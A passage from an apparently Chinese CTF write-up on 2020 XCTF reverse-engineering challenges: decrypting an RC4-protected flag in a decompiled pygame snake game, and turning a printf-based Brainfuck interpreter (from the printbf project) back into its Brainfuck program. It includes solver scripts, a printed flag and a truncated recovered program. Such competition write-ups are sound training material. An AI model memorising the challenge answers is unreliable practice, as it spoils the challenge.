- LINE_WIDTH * <span class="number">2</span>), <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print_text(v24, v25, <span class="number">30</span>, <span class="number">7</span>, <span class="string">f&quot;speed: <span class="subst">&#123;v36 // <span class="number">100</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    print_text(v24, v25, <span class="number">450</span>, <span class="number">7</span>, <span class="string">f&quot;score: <span class="subst">&#123;v36&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> v36 &gt;= <span class="number">5192296858534827628530496329220096</span>:</span><br><span class="line">                        v47 = flag</span><br><span class="line">                        print_text(v24, v26, (SCREEN_WIDTH - v27) // <span class="number">2</span>, (SCREEN_HEIGHT - v28) // <span class="number">2</span>, func(v47), RED)</span><br><span class="line">                    <span class="keyword">if</span> v34:</span><br><span class="line">                        <span class="keyword">if</span> v35:</span><br><span class="line">                            print_text(v24, v26, (SCREEN_WIDTH - v27) // <span class="number">2</span>, (SCREEN_HEIGHT - v28) // <span class="number">2</span>, <span class="string">&#x27;GAME OVER&#x27;</span>, RED)</span><br><span class="line">                    pygame.display.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># okay decompiling main.pyc</span></span><br></pre></td></tr></table></figure><p>可以看到最后getflag这里（func()）的程序逻辑就一个rc4加密，由rc4的特性可知加密和解密流程相同，故复用程序中的rc4()来得到flag。</p><p>uncompyle反编译出来的源码是python3，但是题目本身的源码是python2，注意编码问题。</p><blockquote><p>关于编码问题，可以看：</p><p><a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue5/unipain.html">Unicode之痛 — PyCoder’s Weelky CN</a></p><p><a href="https://www.cnblogs.com/yangmingxianshen/p/7990102.html">关于python2中的unicode和str以及python3中的str和bytes - 明王不动心 - 博客园</a></p></blockquote><p>这里因为反编译做了转换成python3的处理，所以脚本用python3写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_KEY = <span class="string">u&#x27;Y\xf3\x02\xc3%\x9a\x820\x0b\xbb%\x7f~;\xd2\xdc&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span>(<span class="params">v11, key=DEFAULT_KEY, skip=<span class="number">1024</span></span>):</span></span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    v13 = <span class="built_in">bytearray</span>([v14 <span class="keyword">for</span> v14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)])</span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v15 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v12 = (v12 + v13[v15] + <span class="built_in">ord</span>(key[(v15 % <span class="built_in">len</span>(key))])) % <span class="number">256</span></span><br><span class="line">        v16 = v13[v15]</span><br><span class="line">        v17 = v13[v12]</span><br><span class="line">        v13[v15] = v13[v12]</span><br><span class="line">        v13[v12] = v16</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v12 = <span class="number">0</span></span><br><span class="line">        v18 = <span class="number">0</span></span><br><span class="line">        v19 = []</span><br><span class="line">        <span class="keyword">if</span> skip &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> v15 <span class="keyword">in</span> <span class="built_in">range</span>(skip):</span><br><span class="line">                v12 = (v12 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">                v18 = (v18 + v13[v12]) % <span class="number">256</span></span><br><span class="line">                v13[v12], v13[v18] = v13[v18], v13[v12]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> v20 <span class="keyword">in</span> v11:</span><br><span class="line">            v12 = (v12 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            v18 = (v18 + v13[v12]) % <span class="number">256</span></span><br><span class="line">            v13[v12], v13[v18] = v13[v18], v13[v12]</span><br><span class="line">            v21 = v13[((v13[v12] + v13[v18]) % <span class="number">256</span>)]</span><br><span class="line">            v19.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(v20) ^ v21))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(v19)</span><br><span class="line"><span class="comment"># def func(v22):</span></span><br><span class="line"><span class="comment">#     v23 = rc4(v22)</span></span><br><span class="line"><span class="comment">#     if v23.encode(&#x27;utf-8&#x27;).hex() == &#x27;275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0&#x27;:</span></span><br><span class="line"><span class="comment">#         return &#x27;YOU WIN&#x27;</span></span><br><span class="line"><span class="comment">#     return &#x27;YOU LOSE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -=-=-=以上所有为源码中原函数-=-=-=</span></span><br><span class="line"></span><br><span class="line">cipher=<span class="string">&#x27;275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0&#x27;</span></span><br><span class="line">flag=<span class="built_in">bytes</span>.fromhex(cipher).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(rc4(flag))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20201229190337791.png"></p><p><strong>flag{snake_bao_is_really_lucky}</strong></p><h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><blockquote><p>官方wp说的是给了一个brainfuck引擎，跟我赛中攻击格式化字符串漏洞的思路完全不一样(。)，一开始还以为我想得太偏了XD，然而在复现的时候发现这个brainfuck解释器的原理就是攻击格式化字符串漏洞，学到了学到了。</p></blockquote><p><del>以下试图从头开始复现。</del></p><p>通过在<a href="https://duckduckgo.com/">DuckDuckGo</a>上搜索<code>setup()</code>中的特殊字符串<code>&quot;%1$.*1$d %2$hn&quot;</code>查到一个github项目<a href="https://github.com/HexHive/printbf">HexHive&#x2F;printbf: Brainfuck interpreter inside printf</a>，发现其余的字符串与题目中的十分相似，并且<code>pbf_pre.c</code>跟程序逻辑几乎一样，推测是题目的来源。</p><p><img src="/p/wpFor-2020XCTF/image-20210123170914416.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210123171023639.png"></p><p>所以先通过动态调试，把断点设在前面所有的赋值语句之后，用idapython的<code>get_bytes(0x5577FCB50000,16000)</code>提取出progn的内容。</p><p><img src="/p/wpFor-2020XCTF/image-20210123181852813.png"></p><p>通过printbf项目中的<code>pbf_pre.c</code>源码可以知道progn是int *，故将提取出来的byte对象进行处理，然后按照<code>token.py</code>的逻辑逆向写出由progn反向生成的brainfuck程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># token.py from &quot;HexHive/printbf: Brainfuck interpreter inside printf&quot;</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;Nicholas Carlini &lt;npc@berkeley.edu&gt; and Mathias Payer &lt;mathias.payer@nebelwelt.net&gt;&quot;</span></span><br><span class="line">__description__ = <span class="string">&quot;Script to tokenize a BF script into a printf interpreter.&quot;</span></span><br><span class="line">__version__ = <span class="built_in">filter</span>(<span class="built_in">str</span>.isdigit, <span class="string">&quot;$Revision: 1 $&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser = ArgumentParser(description=__description__)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--version&#x27;</span>, action=<span class="string">&#x27;version&#x27;</span>, version=<span class="string">&#x27;%(prog)s &#123;:s&#125;&#x27;</span>.<span class="built_in">format</span>(__version__))</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--template&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;template filename&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Filename for the template to use.&#x27;</span>, required=<span class="literal">False</span>, default=<span class="string">&#x27;bf_pre.c&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-bf&#x27;</span>, <span class="string">&#x27;--brainfuck&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;bf file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;BF program&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;input to bf&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;BF input&#x27;</span>, required=<span class="literal">False</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">                    </span><br><span class="line">prog = <span class="built_in">open</span>(args.brainfuck).read()</span><br><span class="line">prog = <span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> prog <span class="keyword">if</span> x <span class="keyword">in</span> <span class="string">&quot;&lt;&gt;+-.,[]&quot;</span>])</span><br><span class="line">prog = prog.replace(<span class="string">&quot;[-]&quot;</span>, <span class="string">&quot;Z&quot;</span>)</span><br><span class="line"></span><br><span class="line">remap = &#123;<span class="string">&#x27;&lt;&#x27;</span>:[<span class="number">1</span>],</span><br><span class="line">         <span class="string">&#x27;&gt;&#x27;</span>:[<span class="number">2</span>],</span><br><span class="line">         <span class="string">&#x27;+&#x27;</span>:[<span class="number">3</span>],</span><br><span class="line">         <span class="string">&#x27;-&#x27;</span>:[<span class="number">4</span>],</span><br><span class="line">         <span class="string">&#x27;.&#x27;</span>:[<span class="number">5</span>,<span class="number">6</span>],</span><br><span class="line">         <span class="string">&#x27;,&#x27;</span>:[<span class="number">7</span>,<span class="number">8</span>],</span><br><span class="line">         <span class="string">&#x27;[&#x27;</span>:[<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>],</span><br><span class="line">         <span class="string">&#x27;]&#x27;</span>:[<span class="number">12</span>],</span><br><span class="line">         <span class="string">&#x27;Z&#x27;</span>:[<span class="number">13</span>],</span><br><span class="line">         <span class="string">&#x27;F&#x27;</span>:[<span class="number">14</span>],</span><br><span class="line">         <span class="string">&#x27;B&#x27;</span>:[<span class="number">15</span>],<span class="comment">#,16,17],</span></span><br><span class="line">         <span class="string">&#x27;A&#x27;</span>:[<span class="number">18</span>],</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">newprog = []</span><br><span class="line">progiter = <span class="built_in">iter</span>(prog)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(prog):</span><br><span class="line">    e = prog[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> e <span class="keyword">in</span> <span class="string">&#x27;&lt;&gt;+-&#x27;</span>:</span><br><span class="line">        res = itertools.takewhile(<span class="keyword">lambda</span> x: x == e, prog)</span><br><span class="line">        count = <span class="built_in">len</span>(<span class="built_in">list</span>(res))</span><br><span class="line">        <span class="keyword">if</span> e == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            newprog.append((<span class="string">&#x27;F&#x27;</span>,count))</span><br><span class="line">        <span class="keyword">elif</span> e == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            <span class="keyword">assert</span> count &lt; <span class="number">256</span></span><br><span class="line">            newprog.append((<span class="string">&#x27;B&#x27;</span>,<span class="number">65536</span>-count))</span><br><span class="line">        <span class="keyword">elif</span> e == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            newprog.append((<span class="string">&#x27;A&#x27;</span>,count))</span><br><span class="line">        <span class="keyword">elif</span> e == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            newprog.append((<span class="string">&#x27;A&#x27;</span>,<span class="number">256</span>-count))</span><br><span class="line">        prog = prog[count:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        newprog.append(e)</span><br><span class="line">        prog = prog[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">index = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">txt = <span class="built_in">open</span>(args.template).read()</span><br><span class="line">txt = txt.replace(<span class="string">&#x27;###INPUT###&#x27;</span>, args.<span class="built_in">input</span>)</span><br><span class="line"><span class="built_in">print</span> txt[<span class="number">0</span>:txt.find(<span class="string">&#x27;###TOKER###&#x27;</span>)],</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> newprog:</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(e) == <span class="built_in">type</span>(<span class="built_in">tuple</span>()):</span><br><span class="line">        count = e[<span class="number">1</span>]</span><br><span class="line">        e = e[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i,insn <span class="keyword">in</span> <span class="built_in">enumerate</span>(remap[e]):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(index+i*<span class="number">2</span>,insn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">assert</span> i == <span class="number">0</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(index+<span class="number">1</span>,count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> e == <span class="string">&#x27;[&#x27;</span>: <span class="comment"># this is a cgoto</span></span><br><span class="line">        stack.append(index)</span><br><span class="line">    <span class="keyword">elif</span> e == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">        backto = stack.pop()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(backto+<span class="number">1</span>,index*<span class="number">4</span><span class="number">-4</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(backto+<span class="number">3</span>,index*<span class="number">4</span><span class="number">-4</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(backto+<span class="number">5</span>,index*<span class="number">4</span><span class="number">-4</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  progn[%d] = %d;&#x27;</span>%(index+<span class="number">1</span>,(backto<span class="number">-2</span>)*<span class="number">4</span>) <span class="comment"># we always increment PC by 1</span></span><br><span class="line"></span><br><span class="line">    index += <span class="number">2</span>*<span class="built_in">len</span>(remap[e])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> txt[txt.find(<span class="string">&#x27;###TOKER###&#x27;</span>)+<span class="number">11</span>:],</span><br></pre></td></tr></table></figure><p>可以看到实际上就是从progn[2*k]这里看到brainfuck的每一步操作符，而对于”+-&gt;&lt;”这四种操作符的数量由progn[2*k+1]给出，故从这些位置即可提取出bf程序的操作符，得到bf程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="string">b&#x27;&#x27;</span> <span class="comment"># 这里是动态调试提取出的progn字节对象，太长了这里不贴</span></span><br><span class="line">progn=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16000</span>,<span class="number">4</span>):</span><br><span class="line">    progn.append(<span class="built_in">int</span>.from_bytes(p[i:i+<span class="number">4</span>],byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"><span class="comment"># 转化成printbf中的int* progn</span></span><br><span class="line">i=<span class="number">2</span></span><br><span class="line">bfCode=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(progn) <span class="keyword">and</span> progn[i]!=<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> progn[i]==<span class="number">5</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">        i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">7</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;,&#x27;</span></span><br><span class="line">        i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">9</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;[&#x27;</span></span><br><span class="line">        i+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">12</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;]&#x27;</span></span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">13</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;[-]&#x27;</span></span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">14</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;&gt;&#x27;</span>*progn[i+<span class="number">1</span>]</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">15</span>:</span><br><span class="line">        bfCode+=<span class="string">&#x27;&lt;&#x27;</span>*(<span class="number">65536</span>-progn[i+<span class="number">1</span>])</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">18</span>:</span><br><span class="line">        <span class="comment"># 其实这里+和-没法准确区分，且对于无符号char型数据来说-n和+(256-n)得到的结果是一样的，这里选择字符数更少的操作符</span></span><br><span class="line">        <span class="keyword">if</span> progn[i+<span class="number">1</span>]&gt;<span class="number">0x7F</span>:</span><br><span class="line">            bfCode+=<span class="string">&#x27;-&#x27;</span>*(<span class="number">256</span>-progn[i+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bfCode+=<span class="string">&#x27;+&#x27;</span>*progn[i+<span class="number">1</span>]</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] UknCode &quot;</span>+<span class="built_in">str</span>(progn[i])+<span class="string">&quot; in progn[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">print(bfCode)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;]&lt;[-&gt;+&lt;]&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;]&lt;[-&gt;+&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;]&lt;[-&gt;+&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&l